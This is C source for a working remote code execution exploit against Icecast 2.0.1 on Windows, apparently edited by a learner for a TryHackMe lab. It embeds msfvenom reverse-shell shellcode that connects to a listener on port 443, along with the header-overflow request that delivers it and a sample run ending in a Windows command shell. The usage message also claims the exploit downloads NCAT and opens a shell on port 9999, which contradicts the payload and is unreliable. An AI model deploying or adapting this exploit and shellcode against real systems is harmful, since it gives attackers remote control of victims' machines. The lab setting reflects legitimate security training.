/* 

Original exploit here: https://www.exploit-db.com/exploits/568
I couldn't get this to work so I edited it according to
https://www.exploit-db.com/exploits/573

and made sure the shellcode was executed.

Compile and run
root@Kali:~/TryHackme/Ice# gcc 568-edit.c -o 568
root@Kali:~/TryHackme/Ice# ./568 192.168.92.133

Icecast <= 2.0.1 Win32 remote code execution 0.1
by Luigi Auriemma
e-mail: aluigi@altervista.org
web:http://aluigi.altervista.org

shellcode add-on by Delikon
www.delikon.de

- target 192.168.92.133:8000
- send malformed data

Server IS vulnerable!!!

On listener
root@Kali:~# nc -nlvp 443
listening on [any] 443 ...
connect to [192.168.92.128] from (UNKNOWN) [192.168.92.133] 49238
Microsoft Windows [Version 6.1.7601]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

C:\Program Files (x86)\Icecast2 Win32>

*/ 

#include <stdio.h> 
#include <stdlib.h> 
#include <string.h> 

#ifdef WIN32 
#pragma comment(lib, "ws2_32.lib") 
    #include <winsock.h> 
    #include "winerr.h" 

    #define close closesocket 
#else 
    #include <unistd.h> 
    #include <sys/socket.h> 
    #include <sys/types.h> 
    #include <arpa/inet.h> 
    #include <netdb.h> 
    #include <netinet/in.h> 
#endif 

#define VER "0.1" 
#define PORT 8000 
#define BUFFSZ 2048 
#define TIMEOUT 3 
#define EXEC    "GET / HTTP/1.0\r\n" \
                "a\r\n" "a\r\n" "a\r\n" "a\r\n" "a\r\n" "a\r\n" "a\r\n" "a\r\n" \
                "a\r\n" "a\r\n" "a\r\n" "a\r\n" "a\r\n" "a\r\n" "a\r\n" "a\r\n" \
                "a\r\n" "a\r\n" "a\r\n" "a\r\n" "a\r\n" "a\r\n" "a\r\n" "a\r\n" \
                "a\r\n" "a\r\n" "a\r\n" "a\r\n" "a\r\n" "a\r\n" "a\r\n" \
                "\xcc" 

// msfvenom -a x86 --platform Windows -p windows/shell_reverse_tcp LHOST=192.168.92.128 LPORT=443 -b '\x0a\x0d\x00' -f c
unsigned char shellcode[] =
"\xda\xd0\xbf\x4e\x20\x7c\xb1\xd9\x74\x24\xf4\x5a\x33\xc9\xb1"
"\x52\x31\x7a\x17\x83\xc2\x04\x03\x34\x33\x9e\x44\x34\xdb\xdc"
"\xa7\xc4\x1c\x81\x2e\x21\x2d\x81\x55\x22\x1e\x31\x1d\x66\x93"
"\xba\x73\x92\x20\xce\x5b\x95\x81\x65\xba\x98\x12\xd5\xfe\xbb"
"\x90\x24\xd3\x1b\xa8\xe6\x26\x5a\xed\x1b\xca\x0e\xa6\x50\x79"
"\xbe\xc3\x2d\x42\x35\x9f\xa0\xc2\xaa\x68\xc2\xe3\x7d\xe2\x9d"
"\x23\x7c\x27\x96\x6d\x66\x24\x93\x24\x1d\x9e\x6f\xb7\xf7\xee"
"\x90\x14\x36\xdf\x62\x64\x7f\xd8\x9c\x13\x89\x1a\x20\x24\x4e"
"\x60\xfe\xa1\x54\xc2\x75\x11\xb0\xf2\x5a\xc4\x33\xf8\x17\x82"
"\x1b\x1d\xa9\x47\x10\x19\x22\x66\xf6\xab\x70\x4d\xd2\xf0\x23"
"\xec\x43\x5d\x85\x11\x93\x3e\x7a\xb4\xd8\xd3\x6f\xc5\x83\xbb"
"\x5c\xe4\x3b\x3c\xcb\x7f\x48\x0e\x54\xd4\xc6\x22\x1d\xf2\x11"
"\x44\x34\x42\x8d\xbb\xb7\xb3\x84\x7f\xe3\xe3\xbe\x56\x8c\x6f"
"\x3e\x56\x59\x3f\x6e\xf8\x32\x80\xde\xb8\xe2\x68\x34\x37\xdc"
"\x89\x37\x9d\x75\x23\xc2\x76\x70\xbf\x81\xcd\xec\xbd\x19\xd3"
"\x57\x48\xff\xb9\xb7\x1d\xa8\x55\x21\x04\x22\xc7\xae\x92\x4f"
"\xc7\x25\x11\xb0\x86\xcd\x5c\xa2\x7f\x3e\x2b\x98\xd6\x41\x81"
"\xb4\xb5\xd0\x4e\x44\xb3\xc8\xd8\x13\x94\x3f\x11\xf1\x08\x19"
"\x8b\xe7\xd0\xff\xf4\xa3\x0e\x3c\xfa\x2a\xc2\x78\xd8\x3c\x1a"
"\x80\x64\x68\xf2\xd7\x32\xc6\xb4\x81\xf4\xb0\x6e\x7d\x5f\x54"
"\xf6\x4d\x60\x22\xf7\x9b\x16\xca\x46\x72\x6f\xf5\x67\x12\x67"
"\x8e\x95\x82\x88\x45\x1e\xb2\xc2\xc7\x37\x5b\x8b\x92\x05\x06"
"\x2c\x49\x49\x3f\xaf\x7b\x32\xc4\xaf\x0e\x37\x80\x77\xe3\x45"
"\x99\x1d\x03\xf9\x9a\x37";


/* 
in my example 0xcc is used to interrupt the code execution, you must 
put your shellcode exactly there. 
You don't need to call a shellcode offset (CALL ESP, JMP ESP and so 
on) or doing any other annoying operation because the code flow 
points directly there!!! 
Cool and easy 8-) 
*/ 


/*int startWinsock(void) 
{ 
  WSADATA wsa; 
  return WSAStartup(MAKEWORD(2,0),&wsa); 
} 
*/
int timeout(int sock); 
u_long resolv(char *host); 
void std_err(void); 

int main(int argc, char *argv[]) { 
    struct sockaddr_in peer; 
    int sd; 
    u_short port = PORT; 
    u_char buff[BUFFSZ]; 
    u_char buf[4096]; 
    u_char *pointer=NULL; 

    setbuf(stdout, NULL); 

    fputs("\n" 
        "Icecast <= 2.0.1 Win32 remote code execution "VER"\n" 
        "by Luigi Auriemma\n" 
        "e-mail: aluigi@altervista.org\n" 
        "web:http://aluigi.altervista.org\n" 
  "\nshellcode add-on by Delikon\n" 
  "www.delikon.de" 
        "\n", stdout); 

    if(argc < 2) { 
        printf("\nUsage: %s <server> [port(%d)]\n" 
            "\n" 
            "Note: This exploit will force the Icecast server to download NCAT\n" 
            "and after execution it will spwan a shell on 9999\n" 
            "\n", argv[0], PORT); 
        exit(1); 
    } 

#ifdef WIN32
    WSADATA    wsadata;
    WSAStartup(MAKEWORD(1,0), &wsadata);
#endif

    if(argc > 2) port = atoi(argv[2]); 

    peer.sin_addr.s_addr = resolv(argv[1]); 
    peer.sin_port= htons(port); 
    peer.sin_family= AF_INET; 

    memset(buf,0x00,sizeof(buf)); 
    strcpy(buf,EXEC); 
    
pointer =strrchr(buf,0xcc); 

strcpy(pointer,shellcode); 

strcat(buf,"\r\n"); 
strcat(buf,"\r\n"); 
    

    printf("\n- target %s:%hu\n", 
        inet_ntoa(peer.sin_addr), port); 

    sd = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP); 
    if(sd < 0) std_err(); 

    if(connect(sd, (struct sockaddr *)&peer, sizeof(peer)) 
      < 0) std_err(); 

    fputs("- send malformed data\n", stdout); 
    if(send(sd, buf, strlen(buf), 0) 
      < 0) std_err(); 

    if((timeout(sd) < 0) || (recv(sd, buff, BUFFSZ, 0) < 0)) { 
        fputs("\nServer IS vulnerable!!!\n\n", stdout); 
    } else { 
        fputs("\nServer doesn't seem vulnerable\n\n", stdout); 
    } 

    close(sd); 
    return(0); 
} 

int timeout(int sock) { 
    struct timeval tout; 
    fd_set fd_read; 
    int err; 

    tout.tv_sec = TIMEOUT; 
    tout.tv_usec = 0; 
    FD_ZERO(&fd_read); 
    FD_SET(sock, &fd_read); 
    err = select(sock + 1, &fd_read, NULL, NULL, &tout); 
    if(err < 0) std_err(); 
    if(!err) return(-1); 
    return(0); 
} 

u_long resolv(char *host) { 
    struct hostent *hp; 
    u_long host_ip; 

    host_ip = inet_addr(host); 
    if(host_ip == INADDR_NONE) { 
        hp = gethostbyname(host); 
        if(!hp) { 
            printf("\nError: Unable to resolve hostname (%s)\n", host); 
            exit(1); 
        } else host_ip = *(u_long *)(hp->h_addr); 
    } 
    return(host_ip); 
} 

#ifndef WIN32 
    void std_err(void) { 
        exit(1); 
    } 
#endif 

// milw0rm.com [2004-10-06]
